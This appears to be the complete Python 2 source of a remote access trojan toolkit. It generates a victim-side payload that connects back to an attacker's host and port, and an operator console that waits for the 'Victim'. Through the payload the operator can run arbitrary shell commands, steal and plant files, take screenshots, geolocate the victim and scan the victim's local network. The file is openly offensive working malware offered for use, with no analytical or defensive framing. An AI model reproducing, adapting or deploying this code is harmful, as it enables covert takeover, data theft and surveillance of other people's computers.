#!/usr/bin/env python2
# Coded By : Khaled Nassar @knassar702
# Facebook & GITHUB : knassar702
# GPL-2.0
import os,sys,socket,random
from time import sleep
def slow_print(s,fast):
	if fast==1:
	    for c in s + '\n':
	        sys.stdout.write(c)
	        sys.stdout.flush()
	        sleep(5. / 100)
	elif fast==2:
	    for c in s + '\n':
	        sys.stdout.write(c)
	        sys.stdout.flush()
	        sleep(5. / 400)
	elif fast==3:
	    for c in s + '\n':
	        sys.stdout.write(c)
	        sys.stdout.flush()
	        sleep(5. / 600)
	else:
		pass
def restart():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()
db=("""
#!/usr/bin/env python2
import socket, subprocess,os,sys,random
from time import sleep
go=1
try:
	import nmap,pyscreenshot,requests
	myerror=''
except:
	myerror='''[!] Your Victim need this modules ..
	[1] Requests
	[2] python-nmap
	[3] pyscreenshot
	-----------------
	$ pip2 install requests
	$ pip2 install python-nmap
	$ pip2 install pyscreenshot
	$ re() # for restart tha payload
	$ restart your connection ..'''
	go=0
l=random.randint(1,100000)
if go==1:
	nm = nmap.PortScanner()
def nmap(ip):
    data = nm.scan(hosts=ip, arguments='-sP')
    re= [ip for ip, result in data['scan'].iteritems() if result['status']['state'] == 'up']
    for i in range(10):
        try:
            s.send(re[i])
        except:
            s.send('stop')
            break
def re():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()
try:
	s = socket.socket()
	s.connect(('lolh',lolp)) 
except:
	re()
s.send(myerror)
try:
        while True:
                cmd = s.recv(1024)
                if cmd[:2] == 'cd':
                    try:
                          os.chdir(cmd[3:])
                          dir = os.getcwd()
                          s.sendall('bacod')
                    except:
                          s.send('[!] File Not Found ..')
		elif cmd[0:7] == 'netscan' and go==1:
			s.send('get the ip')
			ip=s.recv(1024)
			nmap(ip+'/24')
		elif 'print' in cmd:
			print(cmd[5:])
                elif cmd == 'download':
                        s.send('name')
                        file=s.recv(1024)
                        try:
                                while True:
                                    f = open(file,'rb')
                                    l = f.read(1000000)
                                    while (l):
                                        s.send(l)
                                        l = f.read(1000000)
                                    f.close()
				    s.send('[+] Done ..')
                                    break
                        except:
				s.send('|ERROR|')
                                s.send('[-] ERROR ..')
                elif cmd == 'upload':
                        s.send('ok')
			try:
	                        if s.recv(1024) == 'name':
	                                with open(str(l)+'.pyshell', 'wb') as f:
	                                        while True:
	                                                data = s.recv(100000000)
	                                                # write data to a file
	                                                f.write(data)
							s.send('[+] Done ..')
	                                                break
			except:
				s.send('|ERROR|')
				s.send('[-] ERROR ..')
                elif cmd == 'screenshot' and go==1:
                        im = pyscreenshot.grab()
                        name=str(l)+'.png'
                        im.save(name)
                        s.send('Taked : '+name)
                elif cmd[0:4] == 're()':
                                s.send(' ')
                                s.close()
                                sleep(1.5)
				re()
		elif cmd == 'address' and go==1:
			try:
	                        import requests
	                        res = requests.get('https://ipinfo.io/')
	                        data = res.json()
	                        city = data['city'].encode('utf-8')
	                        ip = data['ip'].encode('utf-8')
	                        location = data['loc'].split(',')
	                        latitude = location[0].encode('utf-8')
	                        longitude = location[1].encode('utf-8')
	                        re=('''
IP : %s
City : %s
Longitude : %s
Latitude : %s
''') % (ip,city,longitude,latitude)
	                        s.send(re)
			except:
	                		s.send('[!] Error ..')
                else:
                        results = subprocess.Popen(cmd, shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                        results = results.stdout.read() + results.stderr.read()

                        s.sendall(''+results)
except:
        s.close()
        sleep(1.5)
        re()

""")

def make_payload(host,port,path):
	global payload
	with open(path,'w') as f:
		f.write(db.replace('lolh',host).replace('lolp',str(port)))
go=0
def make_connection(host,port):
	global ha,go
	try:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.bind((host, port))
			s.listen(1)
			print("[+] Wait The Victim ..")
			c, _ = s.accept()
			go=1
		except:
			print('[-] Error ..')
			go=0
		if go==1:
			print ('[+] Connected .. \n\n')
			print c.recv(1024)
		 	while True:
		     		ha = raw_input('>>>> ')
		     		if ha[0:5] == 'mkdir':
		      			c.send(ha+' && pwd\n')
		      			c.recv(1024)
				elif ha[0:7] == 'myerror':
					c.send('myerror')
					print (c.recv(1024))
		     		elif ha[0:7] == 'meminfo':
		      			c.send('cat /proc/meminfo')
		      			print c.recv(100000)
		     		elif ha[0:7] == 'cpuinfo':
		      			c.send('cat /proc/cpuinfo')
		      			print c.recv(100000)
		     		elif ha == 'kernel_info':
		      			c.send(ha)
		      			ab = c.recv(1024)
		      			print("\n[+] \033[37;1mKernel Version : "+ab)
		     		elif ha[0:7] == "address":
					c.send("address")
					print c.recv(1024)
		     		elif ha[0:2] == "ls":
					c.send('ls -lha')
					print(c.recv(100000))
		     		elif ha[0:2] == "cp" or ha[0:2] == "mv" or ha[0:2] == "rm" or ha[0:4] == "echo" :
					c.send(ha)
		     		elif "cd " == ha or "cd" == ha or "cd  " == ha or "cd   " == ha:
					print('[!] Enter name you file ')
					pass
		     		elif ha[0:4] == 'stop':
					c.send('stop')
					print c.recv(1024)
		     		elif ha[0:8] == 'xdg-open':
					c.send(ha)
		     		elif ha[0:8] == 'openfile':
					file=ha.split()[-1]
					c.send('xdg-open '+file)
		     		elif ha == 'screenshot':
		     			c.send('screenshot')
		    			print (c.recv(1024))
		     		elif ha == 'help':
					print ("""

Simple Commands :
	openurl     : open url in Victim Browser
	ls          : show all file
	mkdir       : make new file
	rm -rf      : remove file
	whoami      : show username
	print       : print message in Victim terminal (BG = False)
	pwd         : show your path
	kernel_info : show information about kernal
	cpuinfo     : show information about cpu
	meminfo     : show information about memory
	address     : show address the Victim
	upload      : upload file to victim
	download    : download file from victim
	openfile    : openfile in victim device
	netscan	    : use simple scan to see who is up on the victim network
	screenshot  : Take screenshot from Victim device
""")
		     		elif ha[0:8] == 'netscan':
					ip=raw_input('\nEX : 192.168.1.1 \n[!] IP : ')
					c.send("netscan")
					if c.recv(1024) == 'get the ip':
						c.send(ip.encode('utf-8'))
					clinet_dict = []
					sleep(1)
					print("\n* IPs *\n-------")
					while True:
						data=c.recv(100000)
						if data == 'stop':
							break
						clinet_dict.append(data)
					for ip in clinet_dict:
						print str(ip)
					del clinet_dict[:]
		     		elif ha[0:2] == 'rm':
		      			c.send(ha+' && pwd\n')
		      			c.recv(1024)
		     		elif ha[0:5] == 'rmdir':
		      			c.send(ha+' && pwd\n')
		      			c.recv(1024)
		     		elif ha[0:6] == 'whoami':
		      			c.send('whoami')
		      			print (c.recv(1024))
		     		elif ha[0:8] == "download":
			  		l=random.randint(1,100000)
			  		c.send('download')
		          		if c.recv(1024) == 'name':
			     			file=raw_input('\n[!] File : ')
			     			c.send(file)
		             			with open(str(l)+'.pyshell', 'wb') as f:
		                  			while True:
		                        			data = c.recv(100000000)
		                        			# write data to a file
		                        			f.write(data)
		                        			break
			  			print (c.recv(1024))
		     		elif "upload" in ha[0:6]:
					c.send('upload')
					if c.recv(1024) == 'ok':
						c.send('name')
						try:
							while True:
						    		try:
						    			filename=raw_input('\n[!] File : ')
						    		except:
									break
						    		f = open(filename,'rb')
						    		l = f.read(1000000)
						    		while (l):
						        		c.send(l)
			       						l = f.read(1000000)
			    			    		f.close()
								break
						    	print(c.recv(1024))
						except:
							print('[-] Error ... ')
		     		elif ha[0:1] == ' ' or ha == '':
			      		pass
		     		elif ha[0:5] == "print":
					c.send(ha)
		     		elif ha [0:7]=="openurl":
					url=ha.split()[-1]
					c.send('xdg-open '+url)
		 	    	else:
		      			c.send(ha)
		      			results = c.recv(10000000)
		      			if results == 'bacod':
						pass
					else:
		      				print (results)
	except KeyboardInterrupt:
		print('[!] Connection is stoped ..')
	except socket.error:
		print('[-] Connection Error ..')
